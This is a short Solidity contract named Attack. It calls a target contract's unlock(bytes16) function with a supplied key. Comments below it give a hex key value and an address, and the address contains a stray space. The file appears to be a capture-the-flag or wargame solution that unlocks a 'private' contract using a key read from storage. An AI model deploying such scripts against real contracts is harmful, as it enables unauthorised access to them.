//SPDX-License-Identifier:MIT
pragma solidity ^0.6.0;

contract Attack{
    function attack(address addr,bytes16 key)external{
        (bool success,)=addr.call(abi.encodeWithSignature("unlock(bytes16)",key));
        require(success,"attack failed");
    }
}

//0xd52c5e2acccd43961e02d7eb82461f29 


//0x5B38Da6a701c5685 45dCfcB03FcB875f56beddC4